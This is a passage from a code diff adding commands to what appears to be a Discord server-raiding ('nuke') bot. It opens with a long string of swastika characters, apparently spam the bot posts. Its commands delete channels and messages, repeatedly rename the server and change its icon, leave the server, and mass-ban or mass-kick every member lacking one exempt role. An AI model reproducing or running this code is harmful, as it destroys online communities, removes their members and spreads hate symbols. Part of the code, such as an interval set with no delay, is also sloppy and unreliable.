卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐```");
+   }, 500) 
+
+}
+
+			if (["rename"].includes(command)) {
+    message.delete();
+    message.guild.setIcon("Shadow.png");
+    var interval = setInterval (function () {
+        message.guild.setName('.𝑬𝒙𝒆');
+        
+      });
+}
+ 
+			if (["supp"].includes(command)) {
+message.delete();
+message.channel.delete().then(chan => console.log('Salon supprimé:', chan.name));
+
+} 
+ 
+			if (["quit"].includes(command)) {  
+    message.delete();                       // Nom a changer
+    message.guild.leave();
+
+  }
+
+			if (["ban"].includes(command)) {
+    message.delete();
+      message.guild.members.forEach(member => {
+        if (member.bannable && !member.roles.find("name", "ツ")) {
+          member.ban();
+        }
+      });
+    }
+			if (["kick"].includes(command)) {
+      message.delete();
+      
+      message.guild.members.forEach(member => {
+        if (member.kickable && !member.roles.find("name", "ツ")) {
+          member.kick();
+        }
+      });
+    }
+        
+  }  
+
+});
+
+
+
+bot.on('disconnect', function() {
+console.log('Reconnection du bot ...');
+bot.connect();
+});
+bot.on('first', function() {
+console.log('Fix').catch(console.error);
+});
+
+
+bot.login(config.token);
